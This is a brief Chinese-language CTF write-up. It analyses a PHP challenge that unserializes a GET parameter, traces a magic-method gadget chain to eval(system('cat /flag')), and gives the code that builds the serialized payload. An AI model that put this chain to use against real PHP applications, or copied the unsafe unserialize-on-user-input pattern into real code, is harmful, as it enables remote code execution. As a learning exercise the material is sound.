<p>分析：<br>    <?php highlight_file(__FILE__); error_reporting(0); class re{     public $chu0;     public function __toString(){         if(!isset($this->chu0)){             return "I can not believes!";         }         $this->chu0->$nononono; //调用pwn的__get
        } } class web {     public $kw;     public $dt;     public function __wakeup() { //第一步
            echo "lalalla".$this->kw; //激活re的__toString()
        }     public function __destruct() {         echo "ALL Done!";     } } class pwn {     public $dusk;     public $over;     public function __get($name) {         if($this->dusk != "gods"){             echo "什么，你竟敢不认可?";         }         $this->over->getflag(); //激发getflag()
        } } class Misc {     public $nothing;     public $flag;     public function getflag() { //最终目的
            eval("system('cat /flag');");     } } class Crypto {     public function __wakeup() {         echo "happy happy happy!";     }     public function getflag() {         echo "you are over!";     } } $ser = $_GET['ser']; unserialize($ser); ?></p>
<p>构造链<br>    <?phpclass re{    public $chu0;    public $nononono;}class web {    public $kw;    public $dt;}class pwn {    public $dusk;    public $over;}class Misc {    public $nothing;    public $flag;    public function getflag() {        eval("system('cat /flag');");    }}$a=new web();$a->kw= new re();$a->kw->chu0=new pwn();$a->kw->nononono="aaa";$a->kw->chu0->over=new Misc();echo serialize($a);?></p>
